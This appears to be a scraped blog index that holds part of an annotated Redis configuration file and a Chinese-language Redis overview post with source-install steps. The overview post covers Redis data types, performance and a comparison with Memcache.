&#x5F53;&#x6B64;&#x9879;&#x4E3A;yes&#x65F6;&#xFF0C;&#x8868;&#x793A;&#x5728;&#x91CD;&#x5199;&#x65F6;&#xFF0C;&#x5BF9;&#x4E8E;&#x65B0;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x4E0D;&#x505A;&#x540C;&#x6B65;&#xFF0C;&#x800C;&#x6682;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;# no-appendfsync-on-rewrite no# &#x8868;&#x793A;&#x5F53;&#x524D;AOF&#x6587;&#x4EF6;&#x7684;&#x5927;&#x5C0F;&#x662F;&#x4E0A;&#x6B21;&#x91CD;&#x5199;AOF&#x6587;&#x4EF6;&#x7684;&#x4E8C;&#x500D;&#x65F6;&#xFF0C;&#x5219;&#x81EA;&#x52A8;&#x65E5;&#x5FD7;&#x91CD;&#x5199;&#x8FC7;&#x7A0B;# auto-aof-rewrite-percentage 100# # # &#x5B9A;&#x4E49;AOF&#x6587;&#x4EF6;&#x91CD;&#x5199;&#x8FC7;&#x7A0B;&#x7684;&#x6761;&#x4EF6;&#xFF0C;&#x6700;&#x5C11;&#x4E3A;&#x5B9A;&#x4E49;&#x5927;&#x5C0F;&#x5219;&#x89E6;&#x53D1;&#x91CD;&#x5199;&#x8FC7;&#x7A0B;# auto-aof-rewrite-min-size 64mb# An AOF file may be found to be truncated at the end during the Redis# startup process, when the AOF data gets loaded back into memory.# This may happen when the system where Redis is running# crashes, especially when an ext4 filesystem is mounted without the# data=ordered option (however this can&apos;t happen when Redis itself# crashes or aborts but the operating system still works correctly).## Redis can either exit with an error when this happens, or load as much# data as possible (the default now) and start if the AOF file is found# to be truncated at the end. The following option controls this behavior.## If aof-load-truncated is set to yes, a truncated AOF file is loaded and# the Redis server starts emitting a log to inform the user of the event.# Otherwise if the option is set to no, the server aborts with an error# and refuses to start. When the option is set to no, the user requires# to fix the AOF file using the &quot;redis-check-aof&quot; utility before to restart# the server.## Note that if the AOF file will be found to be corrupted in the middle# the server will still exit with an error. This option only applies when# Redis will try to read more data from the AOF file but not enough bytes# will be found.aof-load-truncated yes################################ LUA SCRIPTING ################################ Max execution time of a Lua script in milliseconds.## If the maximum execution time is reached Redis will log that a script is# still in execution after the maximum allowed time and will start to# reply to queries with an error.## When a long running script exceeds the maximum execution time only the# SCRIPT KILL and SHUTDOWN NOSAVE commands are available. The first can be# used to stop a script that did not yet called write commands. The second# is the only way to shut down the server in the case a write command was# already issued by the script but the user doesn&apos;t want to wait for the natural# termination of the script.## Set it to 0 or a negative value for unlimited execution without warnings.lua-time-limit 5000################################ REDIS CLUSTER ################################# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++# WARNING EXPERIMENTAL: Redis Cluster is considered to be stable code, however# in order to mark it as &quot;mature&quot; we need to wait for a non trivial percentage# of users to deploy it in production.# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++## Normal Redis instances can&apos;t be part of a Redis Cluster; only nodes that are# started as cluster nodes can. In order to start a Redis instance as a# cluster node enable the cluster support uncommenting the following:## cluster-enabled yes# Every cluster node has a cluster configuration file. This file is not# intended to be edited by hand. It is created and updated by Redis nodes.# Every Redis Cluster node requires a different cluster configuration file.# Make sure that instances running in the same system do not have# overlapping cluster configuration file names.## cluster-config-file nodes-6379.conf# Cluster node timeout is the amount of milliseconds a node must be unreachable# for it to be considered in failure state.# Most other internal time limits are multiple of the node timeout.## cluster-node-timeout 15000# A slave of a failing master will avoid to start a failover if its data# looks too old.## There is no simple way for a slave to actually have a exact measure of# its &quot;data age&quot;, so the following two checks are performed:## 1) If there are multiple slaves able to failover, they exchange messages# in order to try to give an advantage to the slave with the best# replication offset (more data from the master processed).# Slaves will try to get their rank by offset, and apply to the start# of the failover a delay proportional to their rank.## 2) Every single slave computes the time of the last interaction with# its master. This can be the last ping or command received (if the master# is still in the &quot;connected&quot; state), or the time that elapsed since the# disconnection with the master (if the replication link is currently down).# If the last interaction is too old, the slave will not try to failover# at all.## The point &quot;2&quot; can be tuned by user. Specifically a slave will not perform# the failover if, since the last interaction with the master, the time# elapsed is greater than:## (node-timeout * slave-validity-factor) + repl-ping-slave-period## So for example if node-timeout is 30 seconds, and the slave-validity-factor# is 10, and assuming a default repl-ping-slave-period of 10 seconds, the# slave will not try to failover if it was not able to talk with the master# for longer than 310 seconds.## A large slave-validity-factor may allow slaves with too old data to failover# a master, while a too small value may prevent the cluster from being able to# elect a slave at all.## For maximum availability, it is possible to set the slave-validity-factor# to a value of 0, which means, that slaves will always try to failover the# master regardless of the last time they interacted with the master.# (However they&apos;ll always try to apply a delay proportional to their# offset rank).## Zero is the only value able to guarantee that when all the partitions heal# the cluster will always be able to continue.## cluster-slave-validity-factor 10# Cluster slaves are able to migrate to orphaned masters, that are masters# that are left without working slaves. This improves the cluster ability# to resist to failures as otherwise an orphaned master can&apos;t be failed over# in case of failure if it has no working slaves.## Slaves migrate to orphaned masters only if there are still at least a# given number of other working slaves for their old master. This number# is the &quot;migration barrier&quot;. A migration barrier of 1 means that a slave# will migrate only if there is at least 1 other working slave for its master# and so forth. It usually reflects the number of slaves you want for every# master in your cluster.## Default is 1 (slaves migrate only if their masters remain with at least# one slave). To disable migration just set it to a very large value.# A value of 0 can be set but is useful only for debugging and dangerous# in production.## cluster-migration-barrier 1# By default Redis Cluster nodes stop accepting queries if they detect there# is at least an hash slot uncovered (no available node is serving it).# This way if the cluster is partially down (for example a range of hash slots# are no longer covered) all the cluster becomes, eventually, unavailable.# It automatically returns available as soon as all the slots are covered again.## However sometimes you want the subset of the cluster which is working,# to continue to accept queries for the part of the key space that is still# covered. In order to do so, just set the cluster-require-full-coverage# option to no.## cluster-require-full-coverage yes# In order to setup your cluster make sure to read the documentation# available at http://redis.io web site.################################## SLOW LOG #################################### The Redis Slow Log is a system to log queries that exceeded a specified# execution time. The execution time does not include the I/O operations# like talking with the client, sending the reply and so forth,# but just the time needed to actually execute the command (this is the only# stage of command execution where the thread is blocked and can not serve# other requests in the meantime).## You can configure the slow log with two parameters: one tells Redis# what is the execution time, in microseconds, to exceed in order for the# command to get logged, and the other parameter is the length of the# slow log. When a new command is logged the oldest one is removed from the# queue of logged commands.# The following time is expressed in microseconds, so 1000000 is equivalent# to one second. Note that a negative number disables the slow log, while# a value of zero forces the logging of every command.slowlog-log-slower-than 10000# There is no limit to this length. Just be aware that it will consume memory.# You can reclaim memory used by the slow log with SLOWLOG RESET.slowlog-max-len 128################################ LATENCY MONITOR ############################### The Redis latency monitoring subsystem samples different operations# at runtime in order to collect data related to possible sources of# latency of a Redis instance.## Via the LATENCY command this information is available to the user that can# print graphs and obtain reports.## The system only logs operations that were performed in a time equal or# greater than the amount of milliseconds specified via the# latency-monitor-threshold configuration directive. When its value is set# to zero, the latency monitor is turned off.## By default latency monitoring is disabled since it is mostly not needed# if you don&apos;t have latency issues, and collecting data has a performance# impact, that while very small, can be measured under big load. Latency# monitoring can easily be enabled at runtime using the command# &quot;CONFIG SET latency-monitor-threshold &lt;milliseconds&gt;&quot; if needed.latency-monitor-threshold 0############################# EVENT NOTIFICATION ############################### Redis can notify Pub/Sub clients about events happening in the key space.# This feature is documented at http://redis.io/topics/notifications## For instance if keyspace events notification is enabled, and a client# performs a DEL operation on key &quot;foo&quot; stored in the Database 0, two# messages will be published via Pub/Sub:## PUBLISH __keyspace@0__:foo del# PUBLISH __keyevent@0__:del foo## It is possible to select the events that Redis will notify among a set# of classes. Every class is identified by a single character:## K Keyspace events, published with __keyspace@&lt;db&gt;__ prefix.# E Keyevent events, published with __keyevent@&lt;db&gt;__ prefix.# g Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...# $ String commands# l List commands# s Set commands# h Hash commands# z Sorted set commands# x Expired events (events generated every time a key expires)# e Evicted events (events generated when a key is evicted for maxmemory)# A Alias for g$lshzxe, so that the &quot;AKE&quot; string means all the events.## The &quot;notify-keyspace-events&quot; takes as argument a string that is composed# of zero or multiple characters. The empty string means that notifications# are disabled.## Example: to enable list and generic events, from the point of view of the# event name, use:## notify-keyspace-events Elg## Example 2: to get the stream of the expired keys subscribing to channel# name __keyevent@0__:expired use:## notify-keyspace-events Ex## By default all notifications are disabled because most users don&apos;t need# this feature and the feature has some overhead. Note that if you don&apos;t# specify at least one of K or E, no events will be delivered.notify-keyspace-events &quot;&quot;############################### ADVANCED CONFIG ################################ Hashes are encoded using a memory efficient data structure when they have a# small number of entries, and the biggest entry does not exceed a given# threshold. These thresholds can be configured using the following directives.hash-max-ziplist-entries 512hash-max-ziplist-value 64# Lists are also encoded in a special way to save a lot of space.# The number of entries allowed per internal list node can be specified# as a fixed maximum size or a maximum number of elements.# For a fixed maximum size, use -5 through -1, meaning:# -5: max size: 64 Kb &lt;-- not recommended for normal workloads# -4: max size: 32 Kb &lt;-- not recommended# -3: max size: 16 Kb &lt;-- probably not recommended# -2: max size: 8 Kb &lt;-- good# -1: max size: 4 Kb &lt;-- good# Positive numbers mean store up to _exactly_ that number of elements# per list node.# The highest performing option is usually -2 (8 Kb size) or -1 (4 Kb size),# but if your use case is unique, adjust the settings as necessary.list-max-ziplist-size -2# Lists may also be compressed.# Compress depth is the number of quicklist ziplist nodes from *each* side of# the list to *exclude* from compression. The head and tail of the list# are always uncompressed for fast push/pop operations. Settings are:# 0: disable all list compression# 1: depth 1 means &quot;don&apos;t start compressing until after 1 node into the list,# going from either the head or tail&quot;# So: [head]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[tail]# [head], [tail] will always be uncompressed; inner nodes will compress.# 2: [head]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[tail]# 2 here means: don&apos;t compress head or head-&gt;next or tail-&gt;prev or tail,# but compress all nodes between them.# 3: [head]-&gt;[next]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[prev]-&gt;[tail]# etc.list-compress-depth 0# Sets have a special encoding in just one case: when a set is composed# of just strings that happen to be integers in radix 10 in the range# of 64 bit signed integers.# The following configuration setting sets the limit in the size of the# set in order to use this special memory saving encoding.set-max-intset-entries 512# Similarly to hashes and lists, sorted sets are also specially encoded in# order to save a lot of space. This encoding is only used when the length and# elements of a sorted set are below the following limits:zset-max-ziplist-entries 128zset-max-ziplist-value 64# HyperLogLog sparse representation bytes limit. The limit includes the# 16 bytes header. When an HyperLogLog using the sparse representation crosses# this limit, it is converted into the dense representation.## A value greater than 16000 is totally useless, since at that point the# dense representation is more memory efficient.## The suggested value is ~ 3000 in order to have the benefits of# the space efficient encoding without slowing down too much PFADD,# which is O(N) with the sparse encoding. The value can be raised to# ~ 10000 when CPU is not a concern, but space is, and the data set is# composed of many HyperLogLogs with cardinality in the 0 - 15000 range.hll-sparse-max-bytes 3000# Active rehashing uses 1 millisecond every 100 milliseconds of CPU time in# order to help rehashing the main Redis hash table (the one mapping top-level# keys to values). The hash table implementation Redis uses (see dict.c)# performs a lazy rehashing: the more operation you run into a hash table# that is rehashing, the more rehashing &quot;steps&quot; are performed, so if the# server is idle the rehashing is never complete and some more memory is used# by the hash table.## The default is to use this millisecond 10 times every second in order to# actively rehash the main dictionaries, freeing memory when possible.## If unsure:# use &quot;activerehashing no&quot; if you have hard latency requirements and it is# not a good thing in your environment that Redis can reply from time to time# to queries with 2 milliseconds delay.## use &quot;activerehashing yes&quot; if you don&apos;t have such hard requirements but# want to free memory asap when possible.activerehashing yes# The client output buffer limits can be used to force disconnection of clients# that are not reading data from the server fast enough for some reason (a# common reason is that a Pub/Sub client can&apos;t consume messages as fast as the# publisher can produce them).## The limit can be set differently for the three different classes of clients:## normal -&gt; normal clients including MONITOR clients# slave -&gt; slave clients# pubsub -&gt; clients subscribed to at least one pubsub channel or pattern## The syntax of every client-output-buffer-limit directive is the following:## client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;## A client is immediately disconnected once the hard limit is reached, or if# the soft limit is reached and remains reached for the specified number of# seconds (continuously).# So for instance if the hard limit is 32 megabytes and the soft limit is# 16 megabytes / 10 seconds, the client will get disconnected immediately# if the size of the output buffers reach 32 megabytes, but will also get# disconnected if the client reaches 16 megabytes and continuously overcomes# the limit for 10 seconds.## By default normal clients are not limited because they don&apos;t receive data# without asking (in a push way), but just after a request, so only# asynchronous clients may create a scenario where data is requested faster# than it can read.## Instead there is a default limit for pubsub and slave clients, since# subscribers and slaves receive data in a push fashion.## Both the hard or the soft limit can be disabled by setting them to zero.client-output-buffer-limit normal 0 0 0client-output-buffer-limit slave 256mb 64mb 60client-output-buffer-limit pubsub 32mb 8mb 60# Redis calls an internal function to perform many background tasks, like# closing connections of clients in timeout, purging expired keys that are# never requested, and so forth.## Not all tasks are performed with the same frequency, but Redis checks for# tasks to perform according to the specified &quot;hz&quot; value.## By default &quot;hz&quot; is set to 10. Raising the value will use more CPU when# Redis is idle, but at the same time will make Redis more responsive when# there are many keys expiring at the same time, and timeouts may be# handled with more precision.## The range is between 1 and 500, however a value over 100 is usually not# a good idea. Most users should use the default of 10 and raise this up to# 100 only in environments where very low latency is required.hz 10# When a child rewrites the AOF file, if the following option is enabled# the file will be fsync-ed every 32 MB of data generated. This is useful# in order to commit the file to the disk more incrementally and avoid# big latency spikes.aof-rewrite-incremental-fsync yes document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Redis概述","date":"2022-06-07T04:48:52.000Z","path":"/posts/18d7d749/","text":"Redis&#x6982;&#x8FF0;&#x4EC0;&#x4E48;&#x662F;RedisRedis&#x7684;&#x51FA;&#x73B0;&#x65F6;&#x95F4;&#x5E76;&#x4E0D;&#x957F;&#xFF0C;&#x662F;NoSQL&#x7684;&#x4E00;&#x79CD;&#xFF0C;&#x57FA;&#x4E8E;&#x952E;-&#x503C;&#x578B;&#x7684;&#x5B58;&#x50A8;&#xFF0C;&#x4E0E;memcache&#x7C7B;&#x4F3C;&#xFF0C;&#x4F46;&#x662F;memcache&#x4E2D;&#x53EA;&#x662F;&#x5185;&#x5B58;&#x7684;&#x7F13;&#x5B58;&#xFF0C;&#x800C;Redis&#x4E0D;&#x4EC5;&#x662F;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x7F13;&#x5B58;&#xFF0C;&#x8FD8;&#x63D0;&#x4F9B;&#x6301;&#x4E45;&#x5B58;&#x50A8;&#xFF0C;&#x5728;2009&#x5E74;&#x7B2C;&#x4E00;&#x6B21;&#x53D1;&#x5E03;Redis&#x3002; Redis&#x5168;&#x79F0;&#xFF08;Remote Dictionary Server&#xFF09;&#x8FDC;&#x7A0B;&#x5B57;&#x5178;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;&#x5B57;&#x5178;&#x670D;&#x52A1;&#x5668;&#x4ECE;&#x672C;&#x8D28;&#x4E0A;&#x6765;&#x8BB2;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x63D0;&#x4F9B;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x7684;&#x8FDC;&#x7A0B;&#x5B58;&#x50A8;&#x529F;&#x80FD;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;Redis&#x662F;&#x4E00;&#x4E2A;&#x9AD8;&#x7EA7;&#x7684;K-V&#x5B58;&#x50A8;&#xFF0C;&#x548C;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x5B58;&#x50A8;&#xFF0C;&#x56E0;&#x4E3A;Redis&#x9664;&#x4E86;&#x80FD;&#x591F;&#x5B58;&#x50A8;K-V&#x8FD9;&#x79CD;&#x7B80;&#x5355;&#x7684;&#x6570;&#x636E;&#x4E4B;&#x5916;&#xFF0C;&#x8FD8;&#x80FD;&#x591F;&#x5B58;&#x50A8;&#x5217;&#x8868;&#x3001;&#x5B57;&#x5178;&#x3001;hash&#x8868;&#x7B49;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x3002; &#x5728;&#x6027;&#x80FD;&#x4E0A;Redis&#x4E0D;&#x6BD4;memcache&#x5DEE;&#xFF0C;&#x56E0;&#x4E3A;redis&#x6574;&#x4E2A;&#x8FD0;&#x884C;&#x901A;&#x901A;&#x90FD;&#x662F;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x5B83;&#x7684;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x96C6;&#x90FD;&#x662F;&#x4FDD;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#xFF0C;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x5468;&#x671F;&#x6027;&#x7684;&#x5199;&#x5165;&#x5230;&#x78C1;&#x76D8;&#x4E0A;&#xFF0C;&#x4EE5;&#x5B9E;&#x73B0;&#x6570;&#x636E;&#x7684;&#x6301;&#x4E45;&#x529F;&#x80FD;&#xFF0C;&#x800C;&#x8FD9;&#x79CD;&#x5199;&#x78C1;&#x76D8;&#x5E76;&#x4E0D;&#x662F;&#x7528;&#x4E8E;&#x8BBF;&#x95EE;&#xFF0C;&#x800C;&#x4EC5;&#x662F;&#x5197;&#x4F59;&#x529F;&#x80FD;&#xFF0C;&#x6240;&#x4EE5;redis&#x6240;&#x6709;&#x529F;&#x80FD;&#x90FD;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x5B8C;&#x6210;&#xFF0C;&#x56E0;&#x4E3A;&#x6B64;&#x6027;&#x80FD;&#x4E5F;&#x662F;&#x53EF;&#x60F3;&#x800C;&#x77E5;&#x3002; redis&#x4E0E;mamcache&#x4E0D;&#x540C;&#x4E4B;&#x5904;&#x5728;&#x4E8E;redis&#x6709;&#x4E00;&#x4E2A;&#x5468;&#x671F;&#x6027;&#x7684;&#x5C06;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5230;&#x78C1;&#x76D8;&#x4E0A;&#x7684;&#x673A;&#x5236;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x53EA;&#x4E00;&#x79CD;&#xFF0C;&#x6709;&#x4E24;&#x79CD;&#x673A;&#x5236;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;redis&#x6301;&#x4E45;&#x5316;&#x7684;&#x4E00;&#x79CD;&#x5B9E;&#x73B0;&#xFF0C;&#x53E6;&#x5916;&#x4E0E;memcache&#x6709;&#x6240;&#x533A;&#x522B;&#x7684;&#x662F;&#xFF0C;redis&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x54CD;&#x5E94;&#x6240;&#x6709;&#x7684;&#x8BF7;&#x6C42;redis&#x652F;&#x6301;&#x4E3B;&#x4ECE;&#x6A21;&#x5F0F;&#xFF0C;&#x4F46;&#x662F;redis&#x7684;&#x4E3B;&#x4ECE;&#x6A21;&#x5F0F;&#x9ED8;&#x8BA4;&#x5C31;&#x6709;&#x4E00;&#x4E2A;sentinel&#x5DE5;&#x5177;&#xFF0C;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;redis&#x80FD;&#x591F;&#x501F;&#x52A9;&#x4E8E;sentinel&#x5DE5;&#x5177;&#x6765;&#x76D1;&#x63A7;&#x4E3B;&#x4ECE;&#x8282;&#x70B9;&#xFF0C;&#x5F53;&#x4E3B;&#x8282;&#x70B9;&#x53D1;&#x751F;&#x6545;&#x969C;&#x65F6;&#xFF0C;&#x4F1A;&#x81EA;&#x5DF1;&#x63D0;&#x5347;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x4ECE;&#x8282;&#x70B9;&#x6210;&#x4E3A;&#x65B0;&#x7684;&#x4E3B;&#x8282;&#x70B9; &#x5728;redis 3.0&#x7248;&#x672C;&#x53D1;&#x5E03;&#xFF0C;&#x5F00;&#x59CB;&#x652F;&#x6301;redis&#x96C6;&#x7FA4;&#xFF0C;&#x4ECE;&#x800C;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x7528;&#x6237;&#x7684;&#x8BF7;&#x6C42;&#x5206;&#x6563;&#x81F3;&#x591A;&#x4E2A;&#x4E0D;&#x540C;&#x8282;&#x70B9; Redis&#x6240;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x652F;&#x6301;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x6709;&#x3001;String&#xFF08;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5305;&#x542B;&#x6574;&#x6570;&#xFF09;, List&#xFF08;&#x5217;&#x8868;&#xFF09;, Hash&#xFF08;&#x5173;&#x8054;&#x6570;&#x7EC4;&#xFF09;, Sets&#xFF08;&#x96C6;&#x5408;&#xFF09;, Sorted Sets&#xFF08;&#x6709;&#x5E8F;&#x96C6;&#x5408;&#xFF09;, Bitmaps&#xFF08;&#x4F4D;&#x56FE;&#xFF09;, HyperLoglog Redis&#x6027;&#x80FD;&#x8BC4;&#x4F30;1&#x3001;100&#x4E07;&#x8F83;&#x5C0F;&#x7684;&#x952E;&#x5B58;&#x50A8;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5927;&#x6982;&#x6D88;&#x8017;100M&#x5185;&#x5B58; 2&#x3001;&#x7531;&#x4E8E;redis&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#xFF0C;&#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x4E3B;&#x673A;&#x4E0A;&#x6709;&#x591A;&#x4E2A;CPU&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x80FD;&#x591F;&#x4F7F;&#x7528;&#xFF0C;&#x4F46;&#x5E76;&#x4E0D;&#x610F;&#x5473;&#x7740;CPU&#x4F1A;&#x6210;&#x4E3A;&#x74F6;&#x9888;&#xFF0C;&#x56E0;&#x4E3A;redis&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;K-V&#x6570;&#x636E;&#x5B58;&#x50A8;&#xFF0C;CPU&#x901A;&#x5E38;&#x4E0D;&#x4F1A;&#x6210;&#x4E3A;&#x74F6;&#x9888;&#x7684; 3&#x3001;&#x5728;&#x5E38;&#x89C1;&#x7684;linux&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;500K&#xFF08;50&#x4E07;&#xFF09;&#x7684;&#x5E76;&#x53D1;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x4E00;&#x79D2;&#x949F;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x679C;&#x4E3B;&#x673A;&#x786C;&#x4EF6;&#x8F83;&#x597D;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6BCF;&#x79D2;&#x949F;&#x53EF;&#x4EE5;&#x8FBE;&#x5230;&#x4E0A;&#x767E;&#x4E07;&#x7684;&#x5E76;&#x53D1; Redis&#x4E0E;memcache&#x5BF9;&#x6BD4;&#xFF1A; Memcache&#x662F;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x5185;&#x5B58;&#x5BF9;&#x8C61;&#x7F13;&#x5B58;&#x7CFB;&#x7EDF; &#x800C;redis&#x662F;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x6301;&#x4E45;&#x5B58;&#x50A8; Memcache&#x662F;&#x4E00;&#x4E2A;LRU&#x7684;&#x7F13;&#x5B58; redis&#x652F;&#x6301;&#x66F4;&#x591A;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B; Memcache&#x662F;&#x591A;&#x7EBF;&#x7A0B;&#x7684; redis&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x7684; &#x4E8C;&#x8005;&#x6027;&#x80FD;&#x51E0;&#x4E4E;&#x4E0D;&#x76F8;&#x4E0A;&#x4E0B;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;redis&#x4F1A;&#x53D7;&#x5230;&#x786C;&#x76D8;&#x6301;&#x4E45;&#x5316;&#x7684;&#x5F71;&#x54CD;&#xFF0C;&#x4F46;&#x662F;&#x6027;&#x80FD;&#x4ECD;&#x7136;&#x4FDD;&#x6301;&#x5728;&#x4E0E;Memcache&#x4E0D;&#x76F8;&#x4E0A;&#x4E0B;&#xFF0C;&#x662F;&#x975E;&#x5E38;&#x4E86;&#x4E0D;&#x8D77;&#x7684; Redis&#x7684;&#x4F18;&#x52BF; &#x4E30;&#x5BCC;&#x7684;&#xFF08;&#x8D44;&#x6599;&#x5F62;&#x6001;&#xFF09;&#x64CD;&#x4F5C;string&#xFF08;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5305;&#x542B;&#x6574;&#x6570;&#xFF09;, List&#xFF08;&#x5217;&#x8868;&#xFF09;, Hash&#xFF08;&#x5173;&#x8054;&#x6570;&#x7EC4;&#xFF09;, Sets&#xFF08;&#x96C6;&#x5408;&#xFF09;, Sorted Sets&#xFF08;&#x6709;&#x5E8F;&#x96C6;&#x5408;&#xFF09;, Bitmaps&#xFF08;&#x4F4D;&#x56FE;&#xFF09;, HyperLoglog &#x5185;&#x5EFA;Replication&#x548C;culster&#xFF08;&#x81EA;&#x8EAB;&#x652F;&#x6301;&#x590D;&#x5236;&#x53CA;&#x96C6;&#x7FA4;&#x529F;&#x80FD;&#xFF09; &#x652F;&#x6301;&#x5C31;&#x5730;&#x66F4;&#x65B0;&#xFF08;in-place update&#xFF09;&#x64CD;&#x4F5C;&#xFF0C;&#x76F4;&#x63A5;&#x53EF;&#x4EE5;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x5B8C;&#x6210;&#x66F4;&#x65B0;&#x64CD;&#x4F5C; &#x652F;&#x6301;&#x6301;&#x4E45;&#x5316;&#xFF08;&#x78C1;&#x76D8;&#xFF09;&#x907F;&#x514D;&#x96EA;&#x5D29;&#x6548;&#x5E94;&#xFF0C;&#x4E07;&#x4E00;&#x51FA;&#x73B0;&#x96EA;&#x5D29;&#x6548;&#x5E94;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x90FD;&#x65E0;&#x6CD5;&#x6062;&#x590D;&#xFF0C;&#x4F46;redis&#x7531;&#x4E8E;&#x6709;&#x6301;&#x4E45;&#x6027;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x6062;&#x590D; Memcached&#x7684;&#x4F18;&#x52BF; &#x591A;&#x7EBF;&#x7A0B; &#x5584;&#x7528;&#x591A;&#x6838;CPU &#x66F4;&#x5C11;&#x7684;&#x963B;&#x585E;&#x64CD;&#x4F5C; &#x66F4;&#x5C11;&#x7684;&#x5185;&#x5B58;&#x5F00;&#x9500; &#x66F4;&#x5C11;&#x7684;&#x5185;&#x5B58;&#x5206;&#x914D;&#x538B;&#x529B; &#x53EF;&#x80FD;&#x6709;&#x66F4;&#x5C11;&#x7684;&#x5185;&#x5B58;&#x788E;&#x7247; &#x5B89;&#x88C5;Redishttps://redis.io &#x5B98;&#x7F51;https://download.redis.io/releases/ &#x4E0B;&#x8F7D;&#x5730;&#x5740; &#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;&#x83B7;&#x53D6;&#x6E90;&#x7801;&#x5305;12345678910[root@ctos7mini ~]&amp; wget https://download.redis.io/releases/redis-3.2.5.tar.gz--2022-05-09 04:27:32-- https://download.redis.io/releases/redis-3.2.5.tar.gzConnecting to 192.168.73.1:7890... connected.Proxy request sent, awaiting response... 200 OKLength: 1544040 (1.5M) [application/octet-stream]Saving to: &#x2018;redis-3.2.5.tar.gz&#x2019;100%[==================================================================================================================&gt;] 1,544,040 1.10MB/s in 1.3s2022-05-09 04:27:35 (1.10 MB/s) - &#x2018;redis-3.2.5.tar.gz&#x2019; saved [1544040/1544040] &#x89E3;&#x538B;&#x6587;&#x4EF6;&#x5230;/usr/local/1234567891011121314151617181920[root@ctos7mini ~]&amp; tar zxvf redis-3.2.5.tar.gz -C /usr/local/redis-3.2.5/redis-3.2.5/.gitignoreredis-3.2.5/00-RELEASENOTESredis-3.2.5/BUGSredis-3.2.5/CONTRIBUTINGredis-3.2.5/COPYINGredis-3.2.5/INSTALLredis-3.2.5/MANIFESTOredis-3.2.5/Makefileredis-3.2.5/README.mdredis-3.2.5/deps/redis-3.2.5/deps/Makefileredis-3.2.5/deps/README.mdredis-3.2.5/deps/geohash-int/redis-3.2.5/deps/geohash-int/Makefileredis-3.2.5/deps/geohash-int/geohash.credis-3.2.5/deps/geohash-int/geohash.hredis-3.2.5/deps/geohash-int/geohash_helper.c..................&#x7701;&#x7565;.......................... &#x5B89;&#x88C5;&#x7F16;&#x8BD1;&#x73AF;&#x5883;1[root@ctos7mini redis-3.2.5]&amp; yum install -y gcc gcc-c++ kernel-devel &#x7F16;&#x8BD1;Redis1[root@ctos7mini src]&amp; make &amp;&amp; make install 